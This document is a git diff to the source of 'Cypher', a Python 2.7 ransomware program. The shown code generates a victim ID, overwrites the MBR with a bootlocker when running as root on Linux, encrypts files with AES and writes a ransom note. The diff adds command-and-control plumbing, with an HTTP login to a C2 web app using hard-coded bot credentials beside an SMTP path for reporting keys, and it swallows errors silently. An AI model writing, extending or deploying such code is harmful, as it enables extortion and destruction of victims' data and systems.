@@ -1,3 +1,5 @@
+#!/usr/bin/env python2.7
+
 # Cypher is a work in progress, as such this is an Alpha release of the encryption
 # module, for reporting bugs feel free to open an issue or should you wish to 
 # collaborate on this, pull requests are welcomed as well.
@@ -9,7 +11,7 @@ import struct
 import smtplib
 import string
 import datetime
-import time
+import mechanize
 
 import getpass as gp
 
@@ -17,15 +19,16 @@ from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
 from multiprocessing import Pool
 
+# if SMTP == False, HTTP will be used to contact Cypher's C2 web app, request key and post ID. Should the operator prefer
+SMTP = True
+
 
 # Function to generate our client ID
 def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
 	return ''.join(random.choice(chars) for _ in range(size))
 
-
 ID = gen_client_ID(12)
-key = RSA.generate(2048)
-exKey = key.exportKey('PEM')
+
 
 # Check to see if we're on linux and have root, if so use dd to override the MBR with our bootlocker.
 if sys.platform == 'linux2' and gp.getuser() == 'root':
@@ -40,8 +43,29 @@ else:
 		pass
 
 
+def Key_Ops_HTTP():
+	br = mechanize.Browser()
+	br.set_handle_robots(False)
+	br.addheaders = [('user-agent', '  Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3'),
+	('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
 
-def send_ID_Key():
+	try:
+		br.open("http://127.0.0.1:8000/admin/login/?next=/admin/")
+	except Exception as e:
+		# print "[!]Critical, could not open page."
+		# print "\n %s" % (e)
+		pass
+		
+	br.form = list(br.forms())[0]
+	br["username"] = "RansomBot"
+	br["password"] = "prettyflypassw0rd"
+
+	br.submit()
+	# If log in was succesful retrieve key and post ID
+	###---@---###
+	
+
+def send_Key_SMTP():
 	ts = datetime.datetime.now()
 	SERVER = "smtp.gmail.com" 		
 	PORT = 587 						
@@ -62,7 +86,7 @@ def send_ID_Key():
 	except Exception as e:
 		# print e
 		pass
-	
+
 
 
 def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
@@ -151,10 +175,15 @@ def note():
 	handler.close()
 	
 if __name__=="__main__":
-	send_ID_Key()
-	
-	try:
-		select_files()
+	if SMTP == True:
+		send_Key_SMTP()
+	else:
+		Key_Ops_HTTP()
+		
+	select_files()
+		
+	try:	
 		note()
 	except Exception as e:
+		# print e
 		pass
